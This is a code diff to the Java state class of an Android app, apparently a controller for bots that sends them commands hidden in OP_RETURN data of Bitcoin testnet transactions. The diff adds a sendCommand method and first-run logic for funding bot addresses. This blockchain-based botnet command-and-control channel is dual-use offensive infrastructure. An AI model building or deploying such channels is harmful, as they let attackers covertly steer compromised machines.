@@ -10,6 +10,7 @@ import org.bitcoinj.core.Address;
 import org.bitcoinj.core.BlockChain;
 import org.bitcoinj.core.Coin;
 import org.bitcoinj.core.ECKey;
+import org.bitcoinj.core.InsufficientMoneyException;
 import org.bitcoinj.core.NetworkParameters;
 import org.bitcoinj.core.PeerGroup;
 import org.bitcoinj.core.Transaction;
@@ -32,6 +33,7 @@ import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.net.InetSocketAddress;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -49,6 +51,7 @@ public class ApplicationState extends Application {
 
     File keychainFile;
 
+    boolean firstTime;
 
     NetworkParameters params = TestNet3Params.get();
 
@@ -88,10 +91,14 @@ public class ApplicationState extends Application {
         fileMapAddress = new File(getFilesDir(), "map_address.bots");
 
         //Leggiamo il file che tiene traccia dei bot attivi (SE ESISTE)
-        if (!fileMapAddress.exists())
+        if (!fileMapAddress.exists()) {
             saveMappaIndirizzi();
-
-        loadMappaIndirizzi();
+            firstTime = true;
+        }
+        else {
+            loadMappaIndirizzi();
+            firstTime = false;
+        }
 
 
         //Leggiamo o creiamo il wallet
@@ -205,22 +212,6 @@ public class ApplicationState extends Application {
         }
     }
 
-    /*
-    public ArrayList<InetSocketAddress> discoverPeers() {
-        if (isas.size() == 0) {
-            try {
-                long now = new Date().getTime() / 1000;
-                isas.addAll(Arrays.asList(peerDiscovery.getPeers(VersionMessage.NODE_NETWORK, now, TimeUnit.SECONDS)));
-                Collections.shuffle(isas); // try different order each time
-            } catch (PeerDiscoveryException e) {
-                Log.d("Wallet", "Couldn't discover peers.");
-            }
-        }
-        Log.d("Wallet", "discoverPeers returning "+isas.size()+" peers");
-        // shallow clone to prevent concurrent modification exceptions
-        return (ArrayList<InetSocketAddress>) isas.clone();
-    }
-    */
 
     public void setStatoBots(String stato) {
         for (String s : mappaIndirizzi.keySet()) {
@@ -288,8 +279,13 @@ public class ApplicationState extends Application {
 
         Transaction transaction = new Transaction( wallet.getParams());
 
+        Coin value = Coin.MILLICOIN;
+        Log.d("App", "Valore di FIRSTTIME"+String.valueOf(firstTime));
+        if (firstTime) {
+            value = value.add(Coin.MILLICOIN);
+        }
         for (Address address : botAddressList) {
-            transaction.addOutput(Coin.MILLICOIN, address);
+            transaction.addOutput(value, address);
         }
         transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
 
@@ -309,6 +305,29 @@ public class ApplicationState extends Application {
 
     public  String sendCommand(String command, Address botAddress) throws Exception {
 
+        Log.d("App", "INVIO UN COMANDO");
+        byte[] hash = command.getBytes("UTF-8");
+
+        Transaction transaction = new Transaction(wallet.getParams());
+
+        transaction.addOutput(Coin.MILLICOIN, botAddress);
+        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
+
+
+        SendRequest sendRequest = SendRequest.forTx(transaction);
+
+        String string = new String(hash);
+        System.out.println("Sending ... " + string);
+
+        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException
+
+        peerGroup.setMaxConnections(1);
+        peerGroup.broadcastTransaction(sendRequest.tx);
+
+        return transaction.getHashAsString();
+    }
+
+    public String sendCommandGetOS(String command, Address botAddress) throws Exception {
         Log.d("App", "INVIO UN COMANDO");
         byte[] hash = command.getBytes("UTF-8");
 
